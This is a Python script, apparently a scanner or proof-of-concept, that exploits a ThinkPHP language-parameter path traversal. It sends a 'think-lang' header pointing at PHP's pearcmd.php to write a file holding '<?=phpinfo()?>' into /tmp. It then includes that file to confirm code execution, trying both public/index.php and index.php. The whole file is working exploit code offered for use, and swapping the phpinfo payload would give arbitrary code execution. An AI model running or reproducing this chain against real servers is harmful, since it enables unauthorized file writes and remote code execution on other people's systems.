import requests,re,urllib3,subprocess
import urllib3
urllib3.util.url.FRAGMENT_CHARS|={"<",">"}
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class TrickUrlSession(requests.Session):
    def setUrl(self, url):
        self._trickUrl = url
    def send(self, request, **kwargs):
        if self._trickUrl:
            request.url = self._trickUrl
        return requests.Session.send(self, request, **kwargs)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
filename=randomLowercase(8)
content=randomInt(100000,999999)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"	
	try:
		url=baseurl+"public/index.php?+config-create+/<?=phpinfo()?>+/tmp/"+filename+".php"
		headers={
			'Upgrade-Insecure-Requests': '1',
	        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36',
	        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	        'Accept-Encoding': 'gzip, deflate',
	        'Accept-Language': 'zh-CN,zh;q=0.9',
	        'think-lang':'../../../../../../../../usr/local/lib/php/pearcmd',
	        'Cookie': 'think_lang=zh-cn',
	        'Connection': 'close',
	        }
		# response=requests.get(url,headers=headers,timeout=5,verify=False)
		session = TrickUrlSession()
		session.setUrl(url)
		response=session.get(url,headers=headers,timeout=5,verify=False,allow_redirects=False)
		if True:
			r0=True
		else:
			r0=False
		url=baseurl+"public/index.php"
		# print(f'curl -H "think-lang:../../../../../../../../tmp/{filename}" -H "Cookie:think_lang=zh-cn" "'+url+'" -i')
		headers={
		'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36',
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	    'Accept-Encoding': 'gzip, deflate',
	    'Accept-Language': 'zh-CN,zh;q=0.9',
	    'think-lang':f'../../../../../../../../tmp/{filename}',
	    'Cookie': f'think_lang=zh-cn{content}',
	    'Connection': 'close',
		}
		response=requests.get(url,headers=headers,timeout=5,verify=False,allow_redirects=False)
		if "PHP" in response.text and "version" in response.text and "a:" in response.text and "s:" in response.text and "php_dir" in response.text:
			r1=True
		else:
			r1=False
		if r0 and r1:
			p0=True
		else:
			p0=False
	except:
		p0=False
	try:
		url=baseurl+"index.php?+config-create+/<?=phpinfo()?>+/tmp/"+filename+".php"
		headers={
			'Upgrade-Insecure-Requests': '1',
	        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36',
	        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	        'Accept-Encoding': 'gzip, deflate',
	        'Accept-Language': 'zh-CN,zh;q=0.9',
	        'think-lang':'../../../../../../../../usr/local/lib/php/pearcmd',
	        'Cookie': 'think_lang=zh-cn',
	        'Connection': 'close',
	        }
		# response=requests.get(url,headers=headers,timeout=5,verify=False)
		session = TrickUrlSession()
		session.setUrl(url)
		response=session.get(url,headers=headers,timeout=5,verify=False,allow_redirects=False)
		if True:
			r0=True
		else:
			r0=False
		url=baseurl+"index.php"
		# print(f'curl -H "think-lang:../../../../../../../../tmp/{filename}" -H "Cookie:think_lang=zh-cn" "'+url+'" -i')
		headers={
		'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36',
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	    'Accept-Encoding': 'gzip, deflate',
	    'Accept-Language': 'zh-CN,zh;q=0.9',
	    'think-lang':f'../../../../../../../../tmp/{filename}',
	    'Cookie': f'think_lang=zh-cn{content}',
	    'Connection': 'close',
		}
		response=requests.get(url,headers=headers,timeout=5,verify=False,allow_redirects=False)
		if "PHP" in response.text and "version" in response.text and "a:" in response.text and "s:" in response.text and "php_dir" in response.text:
			r1=True
		else:
			r1=False
		if r0 and r1:
			p1=True
		else:
			p1=False
	except:
		p1=False
	if p0 or p1:
		return True
	else:
		return False
